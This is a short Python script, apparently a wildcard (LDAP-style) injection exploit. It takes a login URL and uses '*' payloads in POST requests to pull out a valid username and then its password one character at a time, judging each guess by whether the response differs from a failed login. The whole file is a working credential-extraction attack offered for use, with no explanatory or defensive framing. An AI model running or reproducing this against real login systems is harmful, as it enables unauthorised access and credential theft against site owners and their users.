#!/usr/bin/env python3

# imports
import requests
import os
import sys

if (len(sys.argv)==2):
	target=sys.argv[1]#taking arg as the url/target
	ppgot=''#Sucessful chars user
	psgot=''#Sucessful chars password

else:
    print("-------------------------- ERROR FOUND -----------------------")
    print("Usage: "+str(sys.argv[0])+"http://url:port/login") # error msg
    exit()

#characters
input_data = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","#","$","%","@","!","0","1","2","3","4","5","6","7","8","9","{","}","[","]","_","&","^"," "]
success_user = requests.post(target,data={'username':'*','password':"*"}).text
fail_user = requests.post(target,data={'username':"a",'password':"a"}).text

success_psswd = requests.post(target,data={'username':ppgot,'password':"*"}).text
fail_psswd = requests.post(target,data={'username':"a",'password':"a"}).text

def user(input_data,ppgot,success_user,fail_user):
	for c in input_data:
		checking = ppgot + c + '*'
		payload = {'username':checking,'password':'*'}
		req = requests.post(target,data=payload).text
		if req != fail_user:
			os.system('clear')
			print('DECODED: ' + ppgot + c)
			ppgot = ppgot + c
			user(input_data,ppgot,success_user,fail_user)
			exit()
		else:
			os.system("clear")
			print("Decoding: " + str(ppgot) + str(c))

	print("Completed, user: ",ppgot)
	passwd(input_data,ppgot,psgot,success_psswd,fail_psswd)

def passwd(input_data,ppgot,psgot,success_psswd,fail_psswd):
	for c in input_data:
		tst = psgot+c+"*"
		payload = {'username':ppgot,'password':tst}
		req = requests.post(target,data = payload).text
		if req != fail_psswd:
			os.system("clear")
			print("Completed, user: ",ppgot)
			print("DECODED: " + psgot + c)
			passwd(input_data,ppgot,psgot + c,success_psswd,fail_psswd)
			exit()
		else:
			os.system("clear")
			print("Completed, user: ",ppgot)
			print("Decoding: "+ str(psgot) + str(c))
	print("Completed User: ",ppgot," Password ",psgot)


user(input_data,ppgot,success_user,fail_user)
